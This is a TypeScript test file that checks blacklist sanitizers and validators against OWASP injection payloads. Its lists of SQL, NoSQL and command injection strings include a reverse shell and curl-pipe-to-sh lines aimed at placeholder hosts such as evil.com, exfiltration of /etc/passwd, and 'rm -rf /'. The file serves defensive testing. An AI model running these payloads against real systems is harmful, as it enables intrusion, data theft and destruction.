/**
 * OWASP A03:2021 - Injection Testing
 * SQL Injection, NoSQL Injection, Command Injection, LDAP Injection
 * 
 * @security-test
 * @owasp A03:2021
 * @severity CRITICAL
 */

import * as fc from 'fast-check';

// Input sanitization functions
const sanitizeForSQL = (input: string): string => {
  return input.replace(/['";\\]/g, '').replace(/--/g, '');
};

const sanitizeForNoSQL = (input: string): string => {
  return input.replace(/[${}]/g, '').replace(/\.\./g, '');
};

const sanitizeForCommand = (input: string): string => {
  return input.replace(/[;&|`$(){}[\]<>]/g, '');
};

// Validation functions
const isValidInput = (input: string): boolean => {
  const dangerousPatterns = [
    /['";]/,
    /--/,
    /\/\*/,
    /\*\//,
    /\bOR\b.*=/i,
    /\bAND\b.*=/i,
    /\bUNION\b/i,
    /\bSELECT\b/i,
    /\bDROP\b/i,
    /\bDELETE\b/i,
    /\bINSERT\b/i,
    /\bUPDATE\b/i,
    /\$where/i,
    /\$gt/i,
    /\$lt/i,
    /\$ne/i,
    /\$regex/i
  ];
  
  return !dangerousPatterns.some(pattern => pattern.test(input));
};

describe('OWASP A03:2021 - Injection Tests', () => {
  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "1; DELETE FROM users",
      "' OR 1=1 --",
      "admin'--",
      "' OR ''='",
      "1' ORDER BY 1--+",
      "' UNION SELECT NULL,NULL,NULL--",
      "-1' UNION SELECT 1,2,3--",
      "' AND 1=0 UNION SELECT NULL, table_name FROM information_schema.tables--",
      "1' AND '1'='1",
      "' OR 'x'='x",
      "') OR ('1'='1",
      "' AND id IS NULL; --",
      "' HAVING 1=1 --",
      "' GROUP BY columnnames having 1=1 --",
      "' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')--",
      "'; EXEC xp_cmdshell('dir'); --",
      "'; WAITFOR DELAY '0:0:10'--"
    ];

    it('should detect and block SQL injection attempts', () => {
      sqlInjectionPayloads.forEach(payload => {
        expect(isValidInput(payload)).toBe(false);
      });
    });

    it('should sanitize SQL injection payloads', () => {
      sqlInjectionPayloads.forEach(payload => {
        const sanitized = sanitizeForSQL(payload);
        expect(sanitized).not.toContain("'");
        expect(sanitized).not.toContain('"');
        expect(sanitized).not.toContain('--');
      });
    });

    it('should allow legitimate inputs', () => {
      const legitimateInputs = [
        'john.doe@example.com',
        'John Doe',
        'user123',
        'My password is strong!',
        'Hello World'
      ];

      legitimateInputs.forEach(input => {
        const sanitized = sanitizeForSQL(input);
        expect(sanitized.length).toBeGreaterThan(0);
      });
    });
  });

  describe('NoSQL Injection Prevention', () => {
    const noSqlInjectionPayloads = [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$where": "this.password.length > 0"}',
      '{"$regex": ".*"}',
      '{"password": {"$ne": ""}}',
      '{"$or": [{"a": 1}, {"b": 2}]}',
      '{"username": {"$gt": ""}}',
      '{"$and": [{"username": "admin"}]}',
      '{"$elemMatch": {"$gt": 0}}',
      '{"$nin": [1]}',
      '{"$exists": true}',
      '{"$type": 2}'
    ];

    it('should detect NoSQL injection attempts', () => {
      noSqlInjectionPayloads.forEach(payload => {
        const hasDangerousOperator = /\$\w+/.test(payload);
        expect(hasDangerousOperator).toBe(true);
      });
    });

    it('should sanitize NoSQL operators', () => {
      noSqlInjectionPayloads.forEach(payload => {
        const sanitized = sanitizeForNoSQL(payload);
        expect(sanitized).not.toContain('$');
      });
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '`whoami`',
      '$(id)',
      '& ping -c 10 127.0.0.1',
      '|| cat /etc/shadow',
      '; nc -e /bin/sh attacker.com 4444',
      '| curl http://evil.com/shell.sh | sh',
      '`curl http://evil.com/`',
      '; rm -rf /',
      '&& wget http://evil.com/malware',
      '| mail -s "hacked" attacker@evil.com < /etc/passwd',
      '$(curl http://evil.com/?data=$(cat /etc/passwd))',
      '; echo vulnerable > /tmp/pwned'
    ];

    it('should detect command injection attempts', () => {
      commandInjectionPayloads.forEach(payload => {
        const hasDangerousChar = /[;&|`$()]/.test(payload);
        expect(hasDangerousChar).toBe(true);
      });
    });

    it('should sanitize command injection payloads', () => {
      commandInjectionPayloads.forEach(payload => {
        const sanitized = sanitizeForCommand(payload);
        expect(sanitized).not.toMatch(/[;&|`$()]/);
      });
    });
  });

  describe('Property-Based Injection Testing', () => {
    it('should reject any input containing SQL keywords with operators', () => {
      fc.assert(
        fc.property(
          fc.constantFrom('SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'UNION'),
          fc.constantFrom(' ', '%20', '/**/'),
          fc.constantFrom('*', 'FROM', 'WHERE', 'TABLE'),
          (keyword, space, suffix) => {
            const payload = `' ${keyword}${space}${suffix}`;
            expect(isValidInput(payload)).toBe(false);
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle unicode bypass attempts', () => {
      const unicodePayloads = [
        "＇ OR ＇1＇=＇1",  // Fullwidth apostrophe
        "' OR '1'='1",      // Normal
        "ʼ OR ʼ1ʼ=ʼ1",     // Modifier letter apostrophe
      ];

      unicodePayloads.forEach(payload => {
        // Should normalize and detect
        const normalized = payload.normalize('NFKC');
        if (normalized.includes("'")) {
          expect(isValidInput(normalized)).toBe(false);
        }
      });
    });
  });
});
